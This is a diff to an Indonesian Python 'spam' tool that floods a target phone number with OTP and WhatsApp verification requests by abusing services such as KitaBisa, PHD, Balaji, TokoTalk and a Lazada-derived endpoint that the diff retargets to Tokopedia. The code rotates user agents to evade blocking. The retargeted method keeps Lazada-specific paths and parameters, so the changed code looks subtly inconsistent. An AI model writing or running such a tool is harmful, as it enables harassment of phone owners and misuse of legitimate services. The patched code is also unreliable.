@@ -28,18 +28,18 @@ class spam:
 		elif hasil.status_code == 500:
 			return f'\x1b[91mSpamm kitabisa {self.nomer} \x1b[91mFail!'
 			
-	def lzda(self):
+	def tokped(self):
 		rands=random.choice(open('ua.txt').readlines()).split('\n')[0]
 		kirim = {
 			'User-Agent' : rands,
 			'Accept-Encoding' : 'gzip, deflate',
 			'Connection' : 'keep-alive',
-			'Origin' : 'https://accounts.lazada.com',
+			'Origin' : 'https://accounts.tokopedia.com',
 			'Accept' : 'application/json, text/javascript, */*; q=0.01',
 			'X-Requested-With' : 'XMLHttpRequest',
 			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
 		}
-		regist = requests.get('https://accounts.lazada.com/otp/c/page?otp_type=116&msisdn='+self.nomer+'&ld=https%3A%2F%2Faccounts.lazada.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
+		regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+self.nomer+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
 		Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
 		formulir = {
 			"otp_type" : "116",
@@ -51,11 +51,11 @@ class spam:
 			"signature" : "",
 			"number_otp_digit" : "6"
 		}
-		req = requests.post('https://accounts.lazada.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
+		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
 		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
-			return f'\x1b[91mSpamm Lzda {self.nomer} \x1b[91mFail!'
+			return f'\x1b[91mSpamm Tokped {self.nomer} \x1b[91mFail!'
 		else:
-			return f'\x1b[92mSpamm Lzda {self.nomer} {h}Success!'
+			return f'\x1b[92mSpamm Tokped {self.nomer} {h}Success!'
 
 	def phd(self):
 		param = {'phone_number':self.nomer}
@@ -124,12 +124,12 @@ def files():
 				if jns == 'ktbs':
 					print('\t'+z.spam().__str__())
 				elif jns == 'tkpd':
-					print('\t'+z.lzda().__str__())
+					print('\t'+z.tokped().__str__())
 				elif jns == 'blji':
 					print('\t'+z.balaji().__str__())
 				elif jns == 'smua':
 					print('\t'+z.spam().__str__())
-					print('\t'+z.lzda().__str__())
+					print('\t'+z.tokped().__str__())
 					print('\t'+z.balaji().__str__())
 					print('\t'+z.phd().__str__())
 					print('\t'+z.TokoTalk().__str__())
@@ -152,12 +152,12 @@ def single():
 		if jns == 'ktbs':
 			print('\t'+z.spam().__str__())
 		elif jns == 'tkpd':
-			print('\t'+z.lzda())
+			print('\t'+z.tokped())
 		elif jns == 'blji':
 			print('\t'+z.balaji())
 		elif jns == 'smua':
 			print('\t'+z.spam().__str__())
-			print('\t'+z.lzda())
+			print('\t'+z.tokped())
 			print('\t'+z.balaji())
 			print('\t'+z.phd())
 			print('\t'+z.TokoTalk())
@@ -183,12 +183,12 @@ def multi():
 			if jns == 'ktbs':
 				print('\t'+z.spam().__str__())
 			elif jns == 'tkpd':
-				print('\t'+z.lzda())
+				print('\t'+z.tokped())
 			elif jns == 'blji':
 				print('\t'+z.balaji())
 			elif jns == 'smua':
 				print('\t'+z.spam().__str__())
-				print('\t'+z.lzda())
+				print('\t'+z.tokped())
 				print('\t'+z.balaji())
 				print('\t'+z.phd())
 				print('\t'+z.TokoTalk())
@@ -231,12 +231,12 @@ def termux():
 		if jns == 'ktbs':
 			print('\t'+z.spam().__str__())
 		elif jns == 'tkpd':
-			print('\t'+z.lzda())
+			print('\t'+z.tokped())
 		elif jns == 'blji':
 			print('\t'+z.balaji())
 		elif jns == 'smua':
 			print('\t'+z.spam().__str__())
-			print('\t'+z.lzda())
+			print('\t'+z.tokped())
 			print('\t'+z.balaji())
 			print('\t'+z.phd())
 			print('\t'+z.TokoTalk())
@@ -267,7 +267,7 @@ def main():
 def jnspam():
 	global jns
 	print(logo())
-	print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'SPAM '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'▣'+m+'』'+bm+' Exit\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'All\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'PHD\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'KitaBisa\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'Lazada\n'+b+'║'+m+'『'+h+'5'+m+'』 '+bm+'TokoTalk (Unlimited)\n'+b+'║'+m+'『'+h+'6'+m+'』 '+bm+'Balaji (Without +62 or 0)\n'+b+'╠══════════════════════════════')
+	print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'SPAM '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'▣'+m+'』'+bm+' Exit\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'All\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'PHD\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'KitaBisa\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'Tokopedia\n'+b+'║'+m+'『'+h+'5'+m+'』 '+bm+'TokoTalk (Unlimited)\n'+b+'║'+m+'『'+h+'6'+m+'』 '+bm+'Balaji (Without +62 or 0)\n'+b+'╠══════════════════════════════')
 	while True:
 		oy=str(input(b+'╚══'+m+'〙'+u+'Spam'+m+' ▶ '+h))
 		if( oy == '1' or oy == '01' ):
